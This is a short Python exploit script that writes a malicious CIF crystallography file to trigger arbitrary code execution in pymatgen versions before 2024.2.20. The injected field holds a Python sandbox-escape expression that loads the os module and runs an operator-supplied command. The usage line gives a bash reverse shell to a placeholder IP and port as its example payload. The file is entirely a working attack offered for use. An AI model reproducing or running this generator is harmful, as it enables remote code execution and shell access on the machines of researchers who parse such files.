import sys

# Arbitrary Code Execution in pymatgen library < 2024.2.20

# Checks for arguments.
if len(sys.argv) < 3:
    print("[-] Arguments required!")
    print(f'[!] Command: python3 {sys.argv[0]} <PAYLOAD> <OUTFILE>')
    print(f"[!] es. python3 {sys.argv[0]} \"/bin/bash -c 'sh -i >& /dev/tcp/<IP>/<PORT> 0>&1'\" PWN.cif")
    exit()

# Global variables
Command = sys.argv[1]
Outfile = sys.argv[2]

DATA = "data_PWN\n" + \
        "_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\"__sub\" + \"classes__\"]) () if d.__name__ == \"BuiltinImporter\"][0].load_module (\"os\").system (\"" + \
        Command + \
        "\");0,0,0'\n" + \
        "_space_group_magn.name_BNS  \"P  n'  m  a'  \""

print('[+] Creating file...')
with open(Outfile, "w") as file:
    file.write(DATA)
print("[+] Done!")
